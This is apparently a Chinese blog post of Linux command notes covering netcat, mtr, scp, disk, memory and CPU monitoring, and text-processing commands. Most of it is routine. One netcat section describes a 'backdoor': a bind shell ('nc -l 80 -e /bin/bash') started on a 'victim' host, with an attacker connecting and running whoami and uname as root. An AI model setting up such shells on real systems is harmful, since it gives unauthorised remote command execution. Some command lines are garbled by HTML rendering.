+<h5 id="网络调试"><a href="#网络调试" class="headerlink" title="网络调试"></a>网络调试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">##### 数据传输</span><br><span class="line"></span><br><span class="line">使用netcat实现聊天</span><br></pre></td></tr></table></figure>
+<p>47.98.189.37机器，监听80端口(注意:我这里是aliyun服务器，他的安全策略是只开放了80等端口，你使用其他端口可能无法实现聊天，这是因为阿里云的安全策略控制的，你需要配置你使用的端口)<br>接收端启动监听<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80<br>ff<br>dfgdfg</p>
+<p>发送端(mac机器)连接47.98.189.37机器的80端口<br>[skyler@mac ~]# nc 47.98.189.37 80<br>ff<br>dfgdfg</p>
+<p>输入ff、dfgdfg可以看到消息已经相互传递了。断开时需要手动Ctrl + c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用netcat实现文件传输</span><br></pre></td></tr></table></figure></p>
+<p>[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 &gt; test.sh<br>[root@izbp10lqlgy2g31s41bt94z ~]# ll<br>-rw-r–r– 1 root root     0 10月 29 10:37 test.sh</p>
+<p>[skyler@mac ~]# nc 47.98.189.37 80 &lt; test.sh<br>传输完成，连接自动断开<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 端口扫描工具</span><br></pre></td></tr></table></figure></p>
+<p>实例：nc -v -z -w2 192.168.31.164 1-100</p>
+<p>-v：显示指令执行过程；<br>-z：使用0输入/输出模式，只在扫描通信端口时使用。<br>-w2：设置等待连线的时间为2s；<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -v -z -w2 192.168.31.164 38322<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Connection timed out.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 安全工具</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li>端口转发，作为代理，</li>
+<li>创建后门(也叫反弹shell)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###### 端口转发，作为代理</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>端口转发<br>我们通过选项 -c 来用 nc 进行端口转发，实现端口转发的语法为：<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -u -l  80 -c  ‘ncat -u -l 8080’</p>
+<p>作为代理<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 | nc 192.168.1.200 80<br>所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:</p>
+<p>[root@aizbp11lqlgyf2g31fgsfhg ~]# mkfifo 2way<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 0<2way 1="" 80="" |="" nc="" 192.168.1.200="">2way<br>现在你可以通过 nc 代理来收发数据了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###### 创建后门(也叫反弹shell)</span><br></pre></td></tr></table></figure></2way></p>
+<p>受害者机器主动打开监听。-e为执行被给的命令，“nc -l 80 -e /bin/bash”含义为执行连接端输入的命令<br>[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 -e /bin/bash</p>
+<p>攻击端(连接端)连接受害者机器80端口，然后输入命令获取受害者机器的信息，从而实现攻击<br>[skyler@mac ~]# nc 47.98.189.37 80<br>w<br> 11:21:25 up 493 days, 23:11,  1 user,  load average: 0.00, 0.01, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     pts/0    210.12.157.87    10:13   13.00s  0.04s  0.00s w<br>whoami<br>root<br>uname -a<br>Linux izbp10lqlgy2g31s41bt94z 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 监测工具</span><br></pre></td></tr></table></figure></p>
+<p>启动监听。等待连接端连接<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### mtr - a network diagnostic tool</span><br><span class="line"></span><br><span class="line">是一款更好的网络诊断、网络调试跟踪工具，集成了traceroute、ping、nslookup的判断主机的网络连通性功能，用于诊断网络状态非常有用</span><br></pre></td></tr></table></figure></p>
+<p>[root@aizbp11lqlgyf2g31fgsfhg ~]# mtr <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20191019225352819](linux命令温故知新/image-20191019225352819.png)</span><br><span class="line"></span><br><span class="line">http://einverne.github.io/post/2017/11/mtr-usage.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 网络带宽</span><br></pre></td></tr></table></figure></p>
+<p>nethogs: 按进程查看流量占用<br>iptraf: 按连接/端口查看流量<br>ifstat: 按设备查看流量<br>iftop: 按套接字看连接带宽流量占用<br>ethtool: 诊断工具<br>tcpdump: 抓包工具<br>ss: 连接查看工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 网络传输(数据)</span><br></pre></td></tr></table></figure></p>
+<p>scp：不同机器上远程拷贝文件<br>nc：数据传输<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### scp - secure copy</span><br></pre></td></tr></table></figure></p>
+<p>scp是secure copy的简写，用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。<br>可能会稍微影响一下速度。当你服务器硬盘变为只读 read only system时，用scp可以帮你把文件移出来。<br>另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。<br>虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 命令格式</span><br><span class="line"></span><br><span class="line">&gt; scp [参数] [原路径] [目标路径]</span><br><span class="line"></span><br><span class="line">##### 命令功能</span><br><span class="line"></span><br><span class="line">scp是 secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。linux的scp命令可以在linux服务器之间复制文件和目录。</span><br><span class="line"></span><br><span class="line">##### 命令参数</span><br></pre></td></tr></table></figure></p>
+<p>-1 强制scp命令使用协议ssh1<br>-2 强制scp命令使用协议ssh2<br>-4 强制scp命令只使用IPv4寻址<br>-6 强制scp命令只使用IPv6寻址<br>-B 使用批处理模式（传输过程中不询问传输口令或短语）<br>-C 允许压缩。（将-C标志传递给ssh，从而打开压缩功能）<br>-p 保留原文件的修改时间，访问时间和访问权限。<br>-q 不显示传输进度条。<br>-r 递归复制整个目录。<br>-v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。<br>-c cipher 以cipher将数据传输进行加密，这个选项将直接传递给ssh。<br>-F ssh_config 指定一个替代的ssh配置文件，此参数直接传递给ssh。<br>-i identity_file 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。<br>-l limit 限定用户所能使用的带宽，以Kbit/s为单位。<br>-o ssh_option 如果习惯于使用ssh_config(5)中的参数传递方式，<br>-P port 注意是大写的P, port是指定数据传输用到的端口号<br>-S program 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 使用实例</span><br><span class="line"></span><br><span class="line">###### 从本地服务器上传到远程服务器</span><br></pre></td></tr></table></figure></p>
+<p>(1) 上传文件<br>命令格式：<br>scp local_file remote_username@remote_ip:remote_folder<br>或者<br>scp local_file remote_username@remote_ip:remote_file<br>或者<br>scp local_file remote_ip:remote_folder<br>或者<br>scp local_file remote_ip:remote_file </p>
+<p>第1,2个指定了用户名，命令执行后需要输入用户密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名<br>第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名 </p>
+<p>实例：上传本地文件到远程机器指定目录<br>scp /opt/soft/nginx-0.5.38.tar.gz <a href="mailto:root@10.80.100.20" target="_blank" rel="noopener">root@10.80.100.20</a>:/opt/soft/scptest<br>说明<br>上传本地opt/soft/目录下的文件nginx-0.5.38.tar.gz 到远程机器10.80.100.20的opt/soft/scptest目录</p>
+<p>(2) 上传目录<br>命令格式：<br>scp -r local_folder remote_username@remote_ip:remote_folder<br>或者<br>scp -r local_folder remote_ip:remote_folder<br>第1个指定了用户名，命令执行后需要输入用户密码；<br>第2个没有指定用户名，命令执行后需要输入用户名和密码；</p>
+<p>实例：上传本地目录到远程机器指定目录<br>scp -r /opt/soft/mongodb <a href="mailto:root@10.80.100.20" target="_blank" rel="noopener">root@10.80.100.20</a>:/opt/soft/scptest<br>说明<br>上传本地opt/soft/目录到远程机器10.80.100.20的opt/soft/scptest目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###### 从远程服务器下载到本地服务器</span><br></pre></td></tr></table></figure></p>
+<p>从远程下载到本地的scp命令与上面的命令雷同，只要将从本地上传到远程的命令后面2个参数互换顺序就行了。<br>实例1：从远处下载文件到本地目录<br>scp <a href="mailto:root@10.80.100.20" target="_blank" rel="noopener">root@10.80.100.20</a>:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/<br>说明<br>从10.80.100.20机器上的/opt/soft/的目录中下载nginx-0.5.38.tar.gz 文件到本地/opt/soft/目录中</p>
+<p>实例2：从远处下载目录到本地目录<br>scp -r <a href="mailto:root@10.80.100.20" target="_blank" rel="noopener">root@10.80.100.20</a>:/opt/soft/mongodb /opt/soft/<br>说明<br>从10.80.100.20机器上的/opt/soft/中下载mongodb 目录到本地的/opt/soft/目录来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.cnblogs.com/webnote/p/5877920.html</span><br><span class="line"></span><br><span class="line">#### nc - 数据传输</span><br><span class="line">聊天</span><br></pre></td></tr></table></figure></p>
+<p>看看8090端口是否在使用<br>[work@vm ~]$ lsof -i:8090</p>
+<p>监听8090端口<br>[work@vm ~]$ nc -l 8090<br>ffff<br>ggg<br>wo shi ni de</p>
+<p>连接10.26.21.4机器的8090端口，注意<br>[skyler@skyler ~]$ nc 10.26.21.4 8090<br>ffff<br>ggg<br>wo shi ni de<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## CPU、内存、硬盘的使用状态</span><br><span class="line"></span><br><span class="line">### cpu使用状态</span><br></pre></td></tr></table></figure></p>
+<p>top：获取 CPU 和硬盘的使用状态，通常使用使用 top（htop 更佳）<br>iostat：CPU利用情况报告<br>mpstat：CPU实时监控工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### &apos;iostat -c&apos; CPU利用情况报告</span><br></pre></td></tr></table></figure></p>
+<p>iostat -c 1 10<br>avg-cpu: %user %nice %sys %iowait %idle<br>1.98 0.00 0.35 11.45 86.22<br>avg-cpu: %user %nice %sys %iowait %idle<br>1.62 0.00 0.25 34.46 63.67<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### mpstat- Multiprocessor Statistics</span><br><span class="line"></span><br><span class="line">&gt; 实时CPU监控工具</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### IO</span><br></pre></td></tr></table></figure>
+<p>iostat:设备、分片的输入输出统计数据<br>iotop:监视磁盘I/O使用状况工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### iostat - 报告CPU统计数据和设备、分片的输入输出统计数据</span><br></pre></td></tr></table></figure></p>
+<p>iostat主要用于监控系统设备的IO负载情况<br>iostat -mxz 15 可以让你获悉 CPU 和每个硬盘分区的基本信息和性能表现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### iotop – simple top-like I/O monitor</span><br><span class="line"></span><br><span class="line">&gt; iotop是一个用来监视磁盘I/O使用状况的 top 类工具，可监测到哪一个程序使用的磁盘IO的信息（requires 2.6.20 or later）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 内存使用状态</span><br></pre></td></tr></table></figure></p>
+<p>free：展示内存的已使用和空闲的数量数据<br>vmstat：报告虚拟内存统计数据<br>/proc/meminfo：包含了更多更原始的信息，只是看起来不太直观<br>区别：free为你提供了概要信息，输出结果清晰；/proc/meminfo提供更多更原始的信息，是了解Linux系统内存使用状况的主要接口，我们最常用的”free”、”vmstat”等命令就是通过它获取数据的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### free - Display amount of free and used memory in the system</span><br></pre></td></tr></table></figure></p>
+<p>free<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# free -h<br>              total        used        free      shared  buff/cache   available<br>Mem:           1.8G        1.1G         88M        668K        581M        501M<br>Swap:            0B          0B          0B</p>
+<p>cat /proc/meminfo<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# cat /proc/meminfo<br>MemTotal:        1883492 kB<br>MemFree:           91292 kB<br>MemAvailable:     513480 kB<br>Buffers:          105988 kB<br>Cached:           425896 kB<br>SwapCached:            0 kB<br>Active:          1398952 kB<br>Inactive:         287908 kB<br>Active(anon):    1155456 kB<br>Inactive(anon):      188 kB<br>Active(file):     243496 kB<br>Inactive(file):   287720 kB<br>Unevictable:           0 kB<br>Mlocked:               0 kB<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### vmstat - Report virtual memory statistics</span><br></pre></td></tr></table></figure></p>
+<p>vmstat: 内存使用状态<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# vmstat<br>procs ———–memory———- —swap– —–io—- -system– ——cpu—–<br> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st<br> 4  0      0  91008 106004 489120    0    0     3    11    1    0  2  1 98  0  0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### /proc/meminfo</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 硬(磁)盘使用状态</span><br></pre></td></tr></table></figure>
+<p>df：检查文件系统磁盘占用情况<br>du：检查磁盘空间占用情况,计算每个文件的大小然后累加<br>ncdu：是一个可以替代du命令的工具<br>iostat：硬盘的输入输出使用状态<br>fdisk：磁盘分区表数据，可以创建和维护分区表</p>
+<p>du与df的区别：<br>du是通过搜索文件来计算每个文件的大小然后累加，du能看到的文件只是一些当前存在的，没有被删除的。他计算的大小就是当前他认为存在的所有文件大小的累加和。而df是检查文件系统的磁盘空间使用情况</p>
+<p>du与ncdu的区别：<br>ncdu是一个可以替代du命令的工具，ncdu命令是对传统du命令功能上的增强.它比寻常的命令，如 du -sh *，更节省时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### df - disk free</span><br></pre></td></tr></table></figure></p>
+<p>df -h 查看各分区使用情况<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# df -h<br>文件系统        容量  已用  可用 已用% 挂载点<br>/dev/vda1        40G   19G   19G   51% /<br>devtmpfs        911M     0  911M    0% /dev<br>tmpfs           920M     0  920M    0% /dev/shm<br>tmpfs           920M  668K  920M    1% /run<br>tmpfs           920M     0  920M    0% /sys/fs/cgroup<br>tmpfs           184M     0  184M    0% /run/user/0<br>overlay          40G   19G   19G   51% /var/lib/docker/overlay2/85bcc5f201ed0fbf82697f11da0730fbb8543b0e6cc9707b43b331e6e02d4eb0/merged<br>shm              64M     0   64M    0% /var/lib/docker/containers/10f26d49e94eb6042a25a7807f293a5b75abe75af571414c0ae6e878b0ccdf41/shm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20191020231155867](linux命令温故知新/image-20191020231155867.png)</span><br><span class="line"></span><br><span class="line">#### du - disk usage</span><br><span class="line"></span><br><span class="line">&gt; 硬盘使用情况概述</span><br></pre></td></tr></table></figure>
+<p>查看root目录下的直接层级文件(夹)大小<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# du -sh *<br>52K    hs_err_pid24203.log<br>52K    hs_err_pid25726.log<br>52K    hs_err_pid27481.log<br>4.0K    log.stack<br>2.2G    skyler_home<br>4.0K    test2.sh<br>4.0K    test.sh<br>4.0K    wget-log<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# pwd<br>/root</p>
+<p>查看root目录下的所有层级文件(夹)大小<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# du -h *<br>略<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### ncdu</span><br></pre></td></tr></table></figure></p>
+<p>aliyun默认没有这个命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### iostat：硬盘的输入输出使用状态</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### fdisk：磁盘分区表数据</span><br></pre></td></tr></table></figure>
+<p>列出所有磁盘数据<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# fdisk  -l</p>
+<p>磁盘 /dev/vda：42.9 GB, 42949672960 字节，83886080 个扇区<br>Units = 扇区 of 1 * 512 = 512 bytes<br>扇区大小(逻辑/物理)：512 字节 / 512 字节<br>I/O 大小(最小/最佳)：512 字节 / 512 字节<br>磁盘标签类型：dos<br>磁盘标识符：0x0008d73a</p>
+<p>   设备 Boot      Start         End      Blocks   Id  System<br>/dev/vda1   *        2048    83884031    41940992   83  Linux</p>
+<p>查看/dev/vda1磁盘数据，并可以修改<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# fdisk /dev/vda1<br>欢迎使用 fdisk (util-linux 2.23.2)。</p>
+<p>更改将停留在内存中，直到您决定将更改写入磁盘。<br>使用写入命令前请三思。</p>
+<p>Device does not contain a recognized partition table<br>使用磁盘标识符 0xbc589282 创建新的 DOS 磁盘标签。</p>
+<p>命令(输入 m 获取帮助)：p</p>
+<p>磁盘 /dev/vda1：42.9 GB, 42947575808 字节，83881984 个扇区<br>Units = 扇区 of 1 * 512 = 512 bytes<br>扇区大小(逻辑/物理)：512 字节 / 512 字节<br>I/O 大小(最小/最佳)：512 字节 / 512 字节<br>磁盘标签类型：dos<br>磁盘标识符：0xbc589282</p>
+<pre><code>设备 Boot      Start         End      Blocks   Id  System
+</code></pre><p>命令(输入 m 获取帮助)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 文本处理相关</span><br><span class="line"></span><br><span class="line">### 排序与过滤</span><br><span class="line"></span><br><span class="line">#### sort 排序</span><br></pre></td></tr></table></figure></p>
+<p>sort<br>-t 指定分隔符（通常与 -k 联用）<br>-k 指定用于排序的列号<br>-n 以数字进行排序</p>
+<p>实例：<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# cat test.sh<br>echo $# $0 $1<br>aaa=111<br>echoaaa=1<br>echo aaa=31<br>fff=3<br>bbbf=50<br>aaa=111</p>
+<p>[root@aizbp11lqlgyf2g31fgsfhg ~]# sort -n -t = -k 2 test.sh<br>echo $# $0 $1<br>echoaaa=1<br>fff=3<br>echo aaa=31<br>bbbf=50<br>aaa=111<br>aaa=111<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看到文本按数字大小排序输出。最后两行是重复的，过滤重复我们就需要`uniq`命令了</span><br><span class="line"></span><br><span class="line">#### uniq 过滤</span><br></pre></td></tr></table></figure></p>
+<p>往往与sort一起使用，从名字可以看出来，取唯一的意思<br>解决上文sort -n -t = -k 2 test.sh重复数据的问题，我们只需要这样做<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# sort -t = -k 2 -n test.sh |uniq<br>echo $# $0 $1<br>echoaaa=1<br>fff=3<br>echo aaa=31<br>bbbf=50<br>aaa=111<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 截取与连接</span><br><span class="line"></span><br><span class="line">#### cut 按列切分文本</span><br></pre></td></tr></table></figure></p>
+<p>-b 以字节为单位进行分割<br>-c 以字符为单位进行分割<br>-f 以字段为分隔单位，与-d一起使用，指定显示哪个区域<br>-d 指定分隔符，默认制表符</p>
+<p>实例：获取test-project-web服务配置中第18列=右侧的信息<br>全部信息为：<br>[skyler@tt ~]$ ps -ef|grep test-project-web<br>skyler     11021     1  3 10月09 ?      06:41:36 /usr/local/bin/java -server -Xmn1024m -Xms4096m -Xmx4096m -XX:PermSize=64M -XX:MaxPermSize=128M -XX:+PrintGCDetails -XX:+PrintGCDateStamps -Xloggc:/home/skyler/var/test-project/log/gc.log -Dlogging.path=/home/skyler/var/test-project/log -Dlogging.config.path=/data0/skyler/test-project/test-project/config/cp/ -Dlogging.config=/data0/skyler/test-project/test-project/config/cp/base-logback.xml -jar /data0/skyler/test-project/test-project/lib/test-project-web-1.1.0.jar –spring.profiles.active=dev –spring.config.location=classpath:/,/data0/skyler/test-project/test-project/system/ –spring.config.name=application</p>
+<p>[skyler@tt ~]$ ps -ef|grep test-project-web|awk ‘{print $18}’|cut -d = -f 2<br>/home/skyler/var/test-project/log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### paste 按列拼接文本</span><br></pre></td></tr></table></figure></p>
+<p>可以将两个文件的内容拼接在一起<br>实例：将test.sh与test2.sh拼接在一起<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# echo “aa2” &gt; test2.sh</p>
+<p>[root@aizbp11lqlgyf2g31fgsfhg ~]# cat test.sh<br>echo $# $0 $1<br>aaa=111<br>echoaaa=1<br>echo aaa=31<br>fff=3<br>bbbf=50<br>aaa=111</p>
+<p>[root@aizbp11lqlgyf2g31fgsfhg ~]# paste test.sh test2.sh<br>echo $# $0 $1    aa2<br>aaa=111<br>echoaaa=1<br>echo aaa=31<br>fff=3<br>bbbf=50<br>aaa=111</p>
+<p>-d 按指定分隔符拼接<br>[root@aizbp11lqlgyf2g31fgsfhg ~]# paste test.sh test2.sh -d ‘,’<br>echo $# $0 $1,aa2<br>aaa=111,<br>echoaaa=1,<br>echo aaa=31,<br>fff=3,<br>bbbf=50,<br>aaa=111,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 行列操作 - 重点</span><br><span class="line"></span><br><span class="line">#### awk - 列操作</span><br></pre></td></tr></table></figure>
+<p>awk 和 sed<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### sed - 操作</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 文件处理相关</span><br><span class="line"></span><br><span class="line">### 文件内容比较</span><br><span class="line"></span><br><span class="line">#### diff</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">diff file1 file2 -y</span><br><span class="line"></span><br><span class="line">使用 diff -r tree1 tree2 | diffstat 查看变更的统计数据</span><br></pre></td></tr></table></figure>
+<h4 id="vimdiff-edit-two-three-or-four-versions-of-a-file-with-Vim-and-show-differences"><a href="#vimdiff-edit-two-three-or-four-versions-of-a-file-with-Vim-and-show-differences" class="headerlink" title="vimdiff - edit two, three or four versions of a file with Vim and show differences"></a>vimdiff - edit two, three or four versions of a file with Vim and show differences</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vimdiff 用于比对并编辑文件</span><br></pre></td></tr></table></figure>
